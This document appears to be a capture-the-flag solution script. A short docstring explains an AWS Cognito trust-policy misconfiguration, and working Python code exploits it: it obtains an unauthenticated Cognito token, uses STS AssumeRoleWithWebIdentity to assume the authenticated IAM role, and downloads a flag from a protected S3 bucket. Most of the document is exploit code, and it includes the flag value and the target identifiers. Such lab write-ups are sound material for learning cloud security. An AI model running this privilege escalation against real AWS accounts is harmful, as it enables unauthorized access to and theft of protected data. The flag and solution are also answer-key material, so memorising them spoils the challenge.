"""
Beta App (AWS Cognito Misconfiguration)
=======================================

Problem:
The AWS Cognito Identity Pool was misconfigured. Although it correctly provisioned unauthenticated credentials for the frontend, the IAM Trust Policy on the authenticated role (`mobileapp_cognito_auth_role`) lacked a strict condition check ensuring only authenticated users could assume it (e.g., missing a check on the `amr` claim).

Solution:
We can call the Cognito Identity API to generate an unauthenticated Web Identity Token. Because of the faulty trust policy, we can pass this unauthenticated Web Identity Token to the AWS Security Token Service (STS) via `AssumeRoleWithWebIdentity` to assume the authenticated IAM role. This escalates our privileges, allowing us to read the premium S3 bucket and exfiltrate the flag.

Flag: FLAG{d0nt_tru5t_th3_c0gn1t0_4uth_r0l3_w1th0ut_c0nd1t10n}
"""

import boto3

REGION = "us-east-1"
IDENTITY_POOL_ID = "us-east-1:08d85402-467a-4354-becc-97a9a5c549bd"
ROLE_ARN = "arn:aws:iam::680311749636:role/mobileapp_cognito_auth_role"
BUCKET_NAME = "mobileapp-premium-content-l9tp4r7x"

cognito = boto3.client('cognito-identity', region_name=REGION)

# Step 1: Get an unauthenticated Identity ID
print("[*] Getting unauthenticated identity ID...")
id_resp = cognito.get_id(IdentityPoolId=IDENTITY_POOL_ID)
identity_id = id_resp['IdentityId']
print(f"[+] Identity ID: {identity_id}")

# Step 2: Get OpenID Token for that unauthenticated identity
print("[*] Requesting OpenID Token...")
token_resp = cognito.get_open_id_token(IdentityId=identity_id)
token = token_resp['Token']

# Step 3: Exploit Trust Policy to assume the AUTHENTICATED role
print("[*] Exploiting Trust Policy... Assuming authenticated role.")
sts = boto3.client('sts', region_name=REGION)
assume_resp = sts.assume_role_with_web_identity(
    RoleArn=ROLE_ARN,
    RoleSessionName="ExploitSession",
    WebIdentityToken=token
)

creds = assume_resp['Credentials']
print("[+] Successfully assumed role! AccessKeyId:", creds['AccessKeyId'])

# Step 4: Access the protected S3 bucket using escalated credentials
s3 = boto3.client(
    's3',
    region_name=REGION,
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['SessionToken']
)

print("[*] Downloading flag.txt from premium bucket...")
try:
    obj = s3.get_object(Bucket=BUCKET_NAME, Key="flag.txt")
    flag = obj['Body'].read().decode('utf-8').strip()
    print("\n[+] Success! Flag retrieved:")
    print(flag)
except Exception as e:
    print("[-] Error downloading flag:", e)
